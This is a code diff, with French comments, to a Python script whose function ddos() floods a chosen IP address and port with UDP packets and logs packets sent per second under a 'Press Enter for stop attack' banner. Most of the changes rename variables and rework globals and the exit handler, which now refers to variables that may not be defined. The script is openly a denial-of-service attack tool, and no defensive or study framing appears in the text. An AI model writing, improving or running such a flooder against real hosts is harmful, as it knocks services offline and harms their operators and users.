@@ -265,11 +265,8 @@ def ddos():
 				if input == "":
 					exit = ""
 					return exit
-			input = "0"
-			return 0
 
 	# Définition de thread
-	global thread
 	thread = threading.Thread(target=inputNoInterrupted)
 
 
@@ -282,7 +279,6 @@ def ddos():
 	send = "0"*bytes
 
 	# Création d'un paquet UDP
-	global sock
 	sock = socket.socket(socket.AF_INET, 	socket.SOCK_DGRAM)
 
 	# Heure de fin (en secondes)
@@ -291,8 +287,8 @@ def ddos():
 	nowSecond -= 86400 if nowSecond >= 86400 else 0
 
 	# Variable à 0
-	PacketPerSecond = 0
-	PacketPerSecondTotal = 0
+	packetPerSecond = 0
+	packetPerSecondTotal = 0
 	timeEnd = 0
 	sendTime = now()
 
@@ -304,7 +300,7 @@ def ddos():
 	while True:	
 		
 		# Mise a jour de requete par secondes
-		PacketPerSecond += 1
+		packetPerSecond += 1
 		
 		# Conversion du temps restant en hh:mm:ss
 		(hoursPrint, secondsPrint) = divmod(nowSecondPrint - now(), 3600)
@@ -321,11 +317,11 @@ def ddos():
 			style()
 			printRed("\n                      Press 'Enter' for stop attack")
 			logsHours = "\n["+str(hoursPrint)+":"+str(minutePrint)+":"+str(secondsPrint)+"]"
-			logs = " Adress "+str(ipSave)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(PacketPerSecond)
+			logs = " Adress "+str(ipSave)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(packetPerSecond)
 			printPurple(logsHours)
 			printGreen(logs)
-			PacketPerSecondTotal += PacketPerSecond
-			PacketPerSecond = 0
+			packetPerSecondTotal += packetPerSecond
+			packetPerSecond = 0
 			sendTime = now()
 			timeEnd += 1
 			
@@ -345,10 +341,11 @@ def ddos():
 			secondsPrintTotal = "0" + str(secondsPrintTotal) if secondsPrintTotal < 10 else secondsPrintTotal
 
 			# Affichage des logs total
+			global logsTotalHours, logsTotal
 			style()
 			printRed("\n                                 Finish !\n                               Total logs : ")
 			logsTotalHours = "\n["+str(hoursPrintTotal)+":"+str(minutePrintTotal)+":"+str(secondsPrintTotal)+"]"
-			logsTotal = " Adress "+str(ipSave)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(PacketPerSecondTotal)
+			logsTotal = " Adress "+str(ipSave)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(packetPerSecondTotal)
 			printPurple(logsTotalHours)
 			printGreen(logsTotal)
 			printPurple("\n[*]")
@@ -380,10 +377,9 @@ try:
 		ddos()
 except KeyboardInterrupt:
 	style()
-	printRed("\n                                   Bye !")
+	printRed("\n                                   Bye !\n                      Press 'Enter' for exit")
+	logsTotalHours = "\n["+str(hoursPrintTotal)+":"+str(minutePrintTotal)+":"+str(secondsPrintTotal)+"]"
+	logsTotal = " Adress "+str(ipSave)+" Bytes send "+str(bytes)+" Port "+str(port)+" Packets "+str(packetPerSecondTotal)
 	t.sleep(2)
-	sock.close()
-	timeLocal = 0
-	thread.join()
 	os.system("clear")
 	sys.exit()
